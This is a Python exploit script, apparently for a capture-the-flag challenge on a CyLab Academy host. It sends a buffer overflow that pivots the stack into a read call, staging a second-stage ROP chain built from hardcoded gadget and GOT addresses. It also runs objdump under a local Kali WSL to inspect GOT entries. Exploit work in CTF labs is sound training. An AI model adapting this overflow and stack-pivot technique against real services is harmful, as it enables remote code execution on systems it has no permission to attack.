import sys, socket, time, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "mars.cylabacademy.net", 31809
READ_SEQ = 0x400b6f
POP_RDI = 0x400c03
POP_RSI_R15 = 0x400c01
POP_RBP = 0x400828
LEAVE_RET = 0x400b96
WRITE_PLT = 0x400750
READ_GOT = 0x601fc8   # a verifier
STAGE = 0x602900


def p64(x):
    return struct.pack("<Q", x)


def go(chain_stage2):
    s = socket.create_connection((HOST, PORT), timeout=15)
    s.settimeout(5)
    time.sleep(0.3)
    try:
        s.recv(4096)
    except Exception:
        pass
    s.sendall(b"A" * 32 + p64(STAGE) + p64(READ_SEQ))
    time.sleep(0.4)
    s.sendall(chain_stage2)
    time.sleep(1.0)
    out = b""
    closed = False
    try:
        while True:
            c = s.recv(65536)
            if not c:
                closed = True
                break
            out += c
    except socket.timeout:
        pass
    except Exception:
        closed = True
    s.close()
    return out, closed


# verifier la GOT de write/read dans le binaire d'abord
import subprocess
r = subprocess.run(["wsl", "-d", "kali-linux", "--", "bash", "-lc",
                    "cd /mnt/c/Users/arnol/AppData/Local/Temp/cylab_eps && objdump -R 214_horse | grep -E 'write|read|asprintf'"],
                   capture_output=True, text=True)
print(r.stdout)
